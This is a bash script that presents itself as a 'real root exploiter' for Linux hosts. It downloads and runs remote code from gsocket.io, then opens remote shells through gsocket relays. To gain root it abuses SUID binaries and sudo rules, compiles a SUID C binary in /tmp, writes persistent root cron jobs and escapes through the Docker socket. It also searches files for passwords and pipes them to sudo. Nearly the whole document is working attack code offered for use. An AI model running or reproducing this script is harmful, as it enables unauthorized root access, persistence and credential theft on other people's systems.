#!/bin/bash
# groot_real_exploit.sh

echo "╔══════════════════════════════════════╗"
echo "║    GROOT - REAL ROOT EXPLOITER       ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Generate unique key
KEY="ROOT_$(date +%s)"
echo "[*] Session Key: $KEY"
echo "[*] Run on your machine: gsocket -s $KEY"
echo ""

# Kill old gsocket processes
pkill -f "gsocket\|gs-netcat" 2>/dev/null
sleep 2

# Install gsocket if needed
if ! command -v gsocket &>/dev/null; then
    echo "[*] Installing gsocket..."
    GS_NOINST=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>/dev/null
fi

# REAL EXPLOITATION ATTEMPTS
echo "[*] Starting real exploitation attempts..."
echo "=========================================="

# 1. SUID BASH/SH EXPLOIT
if [ -u "/bin/bash" ]; then
    echo "[+] EXPLOITING: SUID bash found!"
    echo "[>] Getting root shell..."
    exec gsocket -s "$KEY" /bin/bash -p -i
elif [ -u "/bin/sh" ]; then
    echo "[+] EXPLOITING: SUID sh found!"
    echo "[>] Getting root shell..."
    exec gsocket -s "$KEY" /bin/sh -p -i
fi

# 2. SUDO EXPLOIT
echo "[*] Checking sudo..."
SUDO_RESULT=$(sudo -l 2>/dev/null)
if echo "$SUDO_RESULT" | grep -q "(ALL)"; then
    echo "[+] EXPLOITING: Sudo ALL found!"
    echo "[>] Running: sudo gsocket -s $KEY /bin/bash -i"
    exec sudo gsocket -s "$KEY" /bin/bash -i
fi

# Check specific sudo commands
if echo "$SUDO_RESULT" | grep -q "/bin/bash"; then
    echo "[+] EXPLOITING: Can run bash with sudo!"
    CMD=$(echo "$SUDO_RESULT" | grep "/bin/bash" | head -1 | awk '{print $3}')
    exec sudo $CMD -c "gsocket -s $KEY /bin/bash -i"
fi

# 3. SUID FIND EXPLOIT
if [ -u "/usr/bin/find" ]; then
    echo "[+] EXPLOITING: SUID find found!"
    echo "[>] Running find exploit..."
    /usr/bin/find . -exec gsocket -s "$KEY" /bin/bash -p \\; -quit &
    sleep 3
fi

# 4. SUID NMAP EXPLOIT
if [ -u "/usr/bin/nmap" ]; then
    echo "[+] EXPLOITING: SUID nmap found!"
    echo "[>] Running nmap exploit..."
    echo 'os.execute("/bin/bash -p")' | /usr/bin/nmap --interactive 2>/dev/null &
    sleep 3
fi

# 5. CREATE SUID EXPLOIT BINARY
echo "[*] Creating custom SUID exploit..."
cat > /tmp/exploit_root.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    printf("[GROOT] Custom SUID Exploit\n");
    
    // Try to get root
    if (setuid(0) == 0 && setgid(0) == 0) {
        printf("[+] Success! Now running as root (UID: %d)\n", getuid());
        
        // Execute shell via gsocket
        system("gsocket -s ROOT_KEY /bin/bash -p -i");
    } else {
        printf("[-] Failed to get root (Current UID: %d)\n", getuid());
        // Try user shell
        system("gsocket -s ROOT_KEY /bin/bash -i");
    }
    
    return 0;
}
EOF

# Replace KEY in C file
sed -i "s/ROOT_KEY/$KEY/" /tmp/exploit_root.c

# Compile if gcc exists
if command -v gcc >/dev/null; then
    echo "[*] Compiling exploit..."
    gcc /tmp/exploit_root.c -o /tmp/exploit_root 2>/dev/null
    
    if [ -f /tmp/exploit_root ]; then
        chmod +x /tmp/exploit_root
        echo "[*] Trying to get SUID bit..."
        
        # Try different methods to make it SUID
        if [ -w /tmp ]; then
            echo "[>] Attempt 1: Direct chmod in /tmp"
            chmod 4755 /tmp/exploit_root 2>/dev/null
            /tmp/exploit_root &
        fi
        
        # Try with sudo if available
        if echo "$SUDO_RESULT" | grep -q "chmod"; then
            echo "[>] Attempt 2: Using sudo chmod"
            sudo chmod 4755 /tmp/exploit_root 2>/dev/null
            /tmp/exploit_root &
        fi
    fi
fi

# 6. CHECK WRITABLE FILES
echo "[*] Checking for writable system files..."
WRITABLE_FILES=$(find /etc -type f -writable 2>/dev/null | head -10)
if [ -n "$WRITABLE_FILES" ]; then
    echo "[+] Found writable system files!"
    echo "$WRITABLE_FILES" | while read file; do
        echo "   Writable: $file"
        
        # Check if it's ssh key or config
        if [[ "$file" == *"ssh"* ]] || [[ "$file" == *"authorized_keys"* ]]; then
            echo "[!] SSH related file is writable!"
        fi
    done
fi

# 7. CHECK CRON EXPLOIT
echo "[*] Checking cron jobs..."
if [ -w /etc/crontab ]; then
    echo "[+] EXPLOITING: /etc/crontab is writable!"
    echo "[>] Adding cron job for root shell..."
    echo "* * * * * root gsocket -s $KEY /bin/bash -p -i" >> /etc/crontab
    echo "[*] Cron job added. Waiting 60 seconds for execution..."
    sleep 60
fi

# Check cron directories
for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -w "$dir" ]; then
        echo "[+] EXPLOITING: $dir is writable!"
        CRON_FILE="$dir/groot_root"
        echo "* * * * * root gsocket -s $KEY /bin/bash -p -i" > "$CRON_FILE"
        chmod +x "$CRON_FILE" 2>/dev/null
        echo "[*] Cron file created: $CRON_FILE"
        sleep 60
    fi
done

# 8. DOCKER/SOCKET CHECK
echo "[*] Checking for Docker socket..."
if [ -w /var/run/docker.sock ]; then
    echo "[+] EXPLOITING: Docker socket is writable!"
    echo "[>] Getting root via Docker..."
    docker run -v /:/mnt --rm -it alpine chroot /mnt gsocket -s "$KEY" /bin/bash -p -i
fi

# 9. FINAL ATTEMPT: TRY TO FIND PASSWORD
echo "[*] Looking for passwords..."
PASS_FILES=$(find / -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null | head -5)
for file in $PASS_FILES; do
    echo "[*] Checking: $file"
    PASS=$(grep -E "password.*=.*|passwd.*=.*|secret.*=.*" "$file" 2>/dev/null | head -1)
    if [ -n "$PASS" ]; then
        echo "[+] Found potential password in $file"
        # Try to use with sudo
        echo "$PASS" | sudo -S gsocket -s "$KEY" /bin/bash -i 2>/dev/null
    fi
done

# 10. LAST RESORT: User shell
echo "[-] All exploitation attempts failed"
echo "[*] Starting user shell..."
echo "[*] You can try manual commands from this shell"
echo "[*] Connect with: gsocket -s $KEY"
echo "=========================================="
exec gsocket -s "$KEY" /bin/bash -i
